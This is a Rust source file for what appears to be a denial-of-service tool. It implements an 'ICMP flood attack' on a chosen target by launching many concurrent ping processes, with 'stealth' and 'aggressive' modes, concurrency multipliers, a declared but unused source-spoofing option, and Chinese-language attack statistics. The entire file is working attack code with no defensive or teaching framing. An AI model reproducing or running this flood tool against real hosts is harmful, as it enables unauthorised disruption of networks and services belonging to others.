use crate::stats::{Stats, StatsArc};
use indicatif::{ProgressBar, ProgressStyle};
use rand::Rng;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::time::sleep;

#[derive(Debug, Clone)]
pub struct IcmpFloodConfig {
    pub target: String,
    pub connections: usize,
    pub duration: u64,
    pub packet_size: usize,
    pub mode: String,
    pub spoof_source: bool,
    pub random_packet_size: bool,
    pub min_packet_size: usize,
    pub max_packet_size: usize,
}

pub async fn run_icmp_flood(config: IcmpFloodConfig) {
    println!("🌊 ICMP洪水攻击开始");
    println!("目标: {}", config.target);
    println!("并发连接数: {}", config.connections);
    println!("持续时间: {}秒", config.duration);
    println!("攻击模式: {}", config.mode);
    println!("数据包大小: {}字节", config.packet_size);
    println!("伪装源IP: {}", if config.spoof_source { "是" } else { "否" });
    println!("随机数据包大小: {}", if config.random_packet_size { "是" } else { "否" });
    println!();

    let stats_collector = Arc::new(StatsArc::default());
    let start_time = Instant::now();
    let duration = Duration::from_secs(config.duration);

    // 创建进度条
    let progress_bar = ProgressBar::new(config.duration);
    progress_bar.set_style(
        ProgressStyle::default_bar()
            .template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos}/{len}s ({eta})")
            .unwrap()
            .progress_chars("#>-"),
    );

    // 根据攻击模式调整参数 - 极限性能优化
    let (connections, delay_range) = match config.mode.as_str() {
        "normal" => (config.connections * 4, 0..1),        // 极限增加并发，无延迟
        "stealth" => (config.connections * 2, 1..5),       // 增加隐蔽性并发
        "aggressive" => (config.connections * 8, 0..0),    // 极限增加并发，完全无延迟
        _ => (config.connections * 4, 0..1),
    };

    println!("🎯 调整后的参数:");
    println!("实际并发数: {}", connections);
    println!("延迟范围: {}ms - {}ms", delay_range.start, delay_range.end);
    println!();

    // 启动统计更新任务
    let stats_collector_clone = stats_collector.clone();
    let progress_bar_clone = progress_bar.clone();
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(1));
        loop {
            interval.tick().await;
            let stats = stats_collector_clone.lock().unwrap();
            progress_bar_clone.set_message(format!(
                "📊 RPS: {} | 成功: {} | 失败: {} | 总计: {}",
                stats.total_requests, stats.successful_requests, stats.failed_requests, stats.total_requests
            ));
        }
    });

    // 启动ICMP洪水攻击任务
    let mut handles = Vec::new();
    for _ in 0..connections {
        let config_clone = config.clone();
        let stats_collector_clone = stats_collector.clone();
        let delay_range_clone = delay_range.clone();

        let handle = tokio::spawn(async move {
            icmp_flood_worker(config_clone, stats_collector_clone, delay_range_clone).await;
        });
        handles.push(handle);
    }

    // 等待所有任务完成或超时
    let timeout_future = tokio::time::sleep(duration);
    let _ = tokio::select! {
        _ = async {
            for handle in handles {
                let _ = handle.await;
            }
        } => {},
        _ = timeout_future => {
            println!("⏰ 攻击时间结束");
        }
    };

    progress_bar.finish_with_message("攻击完成");

    // 显示最终统计
    let final_stats = stats_collector.lock().unwrap();
    let elapsed = start_time.elapsed();
    
    println!("\n📊 最终攻击统计:");
    println!("总运行时间: {:.2}秒", elapsed.as_secs_f64());
    println!("目标: {}", config.target);
    println!("并发连接数: {}", connections);
    println!("总请求数: {}", final_stats.total_requests);
    println!("成功请求: {}", final_stats.successful_requests);
    println!("失败请求: {}", final_stats.failed_requests);
    println!("平均RPS: {:.0}", final_stats.total_requests as f64 / elapsed.as_secs_f64());
    println!("成功率: {:.1}%", 
        if final_stats.total_requests > 0 {
            (final_stats.successful_requests as f64 / final_stats.total_requests as f64) * 100.0
        } else {
            0.0
        }
    );
}

async fn icmp_flood_worker(
    config: IcmpFloodConfig,
    stats_collector: Arc<StatsArc>,
    delay_range: std::ops::Range<u64>,
) {
    loop {
        // 生成随机延迟
        let delay = rand::thread_rng().gen_range(delay_range.clone());
        sleep(Duration::from_millis(delay)).await;

        // 生成数据包大小
        let packet_size = if config.random_packet_size {
            rand::thread_rng().gen_range(config.min_packet_size..=config.max_packet_size)
        } else {
            config.packet_size
        };

        // 发送ICMP包
        match send_icmp_packet(&config.target, packet_size).await {
            Ok(_) => {
                let mut stats = stats_collector.lock().unwrap();
                stats.add_request(true, packet_size as u64, 0);
            }
            Err(_) => {
                let mut stats = stats_collector.lock().unwrap();
                stats.add_request(false, packet_size as u64, 0);
            }
        }
    }
}

async fn send_icmp_packet(target: &str, packet_size: usize) -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        use tokio::process::Command;
        
        // Windows下使用ping命令
        let output = Command::new("ping")
            .args(&["-n", "1", "-l", &packet_size.to_string(), target])
            .output()
            .await;
            
        match output {
            Ok(_) => Ok(()),
            Err(_) => Err("ping命令执行失败".into()),
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        use tokio::process::Command;
        
        // Unix系统下使用ping命令
        let output = Command::new("ping")
            .args(&["-c", "1", "-s", &packet_size.to_string(), target])
            .output()
            .await;
            
        match output {
            Ok(_) => Ok(()),
            Err(_) => Err("ping命令执行失败".into()),
        }
    }
} 